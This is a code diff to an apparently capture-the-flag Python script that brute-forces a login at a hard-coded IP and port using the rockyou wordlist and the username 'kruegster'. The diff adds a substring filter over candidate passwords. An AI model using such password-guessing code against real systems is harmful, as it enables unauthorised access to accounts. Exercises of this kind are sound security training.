@@ -29,6 +29,7 @@ import socket
 host = "142.93.117.193" # IP address here
 port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+filter = ''
 
 def brute_force():
     """
@@ -56,14 +57,14 @@ def brute_force():
     """
 
     username = "kruegster"
-    password = "" # Hint: use wordlist
-
-
-
+    filter = ""
     words = open(wordlist,'r')
+    print("Running with filter {}".format(filter))
 
     while True:
         pwd = words.readline()
+        if not (filter in pwd):
+            continue
         print(pwd)
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
